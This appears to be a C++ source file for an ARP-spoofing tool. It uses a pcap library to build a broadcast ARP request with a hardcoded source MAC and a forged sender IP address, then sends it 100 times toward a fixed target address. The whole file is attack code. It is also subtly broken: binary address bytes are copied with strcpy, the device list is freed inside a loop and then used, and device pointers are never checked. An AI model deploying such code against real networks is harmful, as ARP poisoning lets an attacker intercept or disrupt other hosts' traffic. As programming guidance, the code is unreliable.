#include "ArpSpoof.h"
#include <iostream>

using std::cout;
using std::cin;
using std::endl;


ArpSpoof::ArpSpoof(/* args */)
{
}
ArpSpoof::~ArpSpoof()
{
}


void ArpSpoof::initDevice()
{
    int ret = pcap_findalldevs(&m_alldevices,errbuf);
    if (ret == -1)
    {
        cout<<errbuf<<endl;
    }
    else
    {
        for (pcap_if_t *d = m_alldevices; d; d = d->next)
        {
            // cout<<d->name;
            if (d->description)
            {
                cout<<d->description<<endl;
            }
            else
            {
                cout<<"no description"<<endl;
                pcap_freealldevs(m_alldevices);
            }
            
        }
    }
    m_device = m_alldevices;
    for (size_t i = 0; i < 2; i++)
    {
        m_device = m_device->next;
    }

}

void ArpSpoof::SetArpPacker()
{
    
	BYTE dhost[8];
    dhost[0] = 0xff;
	dhost[1] = 0xff;
	dhost[2] = 0xff;
	dhost[3] = 0xff;
	dhost[4] = 0xff;
	dhost[5] = 0xff;
    BYTE shost[8];
    shost[0] = 0x00;
	shost[1] = 0x0C;
	shost[2] = 0x29;
	shost[3] = 0x4B;
	shost[4] = 0x78;
	shost[5] = 0xAB;
    memcpy(m_arppacket.EtherHead.ether_dhost,dhost,6);
    memcpy(m_arppacket.EtherHead.ether_shost , shost,6);
    m_arppacket.EtherHead.ether_type =htons(0x0806);
    
    m_arppacket.ArpHead.hardware_type = htons(0x1);
    m_arppacket.ArpHead.protocol_type = htons(0x0800);
    m_arppacket.ArpHead.hardware_length = 6;
    m_arppacket.ArpHead.protocol_length = 4;
    m_arppacket.ArpHead.operation_code = htons(0x1);

    u_char dip[4];
    dip[0] = 0xac;
	dip[1] = 0x16;
	dip[2] = 0x4a;
	dip[3] = 0x29;
    u_char sip[4];
    sip[0] = 0xc0;
	sip[1] = 0xc0;
	sip[2] = 0xc0;
	sip[3] = 0xc0;
    strcpy((char *)m_arppacket.ArpHead.source_ip_address , (char *)sip);
    strcpy((char *)m_arppacket.ArpHead.source_ethernet_address , (char *)shost);
    strcpy((char *)m_arppacket.ArpHead.destination_ethernet_address , (char *)dhost);
    strcpy((char *)m_arppacket.ArpHead.destination_ip_address , (char *)dip);


}

void ArpSpoof::SendPacket()
{
    m_fp = pcap_open(m_device->name,65535,PCAP_OPENFLAG_PROMISCUOUS,1000,NULL,errbuf);
    u_char *packet;
    int ret = pcap_sendpacket(m_fp,(const u_char *)&m_arppacket,sizeof(m_arppacket));
    if (ret == 0)
    {
        cout<<endl<<"PacketSend succeed"<<endl;
    }
    else {
		cout<<"PacketSendPacket in getmine Error: "<<GetLastError();
	}
    
}

int main()
{
    ArpSpoof arpspoof;
    arpspoof.initDevice();
    arpspoof.SetArpPacker();
    int i = 100;
    while (i>0)
    {
        arpspoof.SendPacket();
        i--;
    }
    
    
    cin.get();
}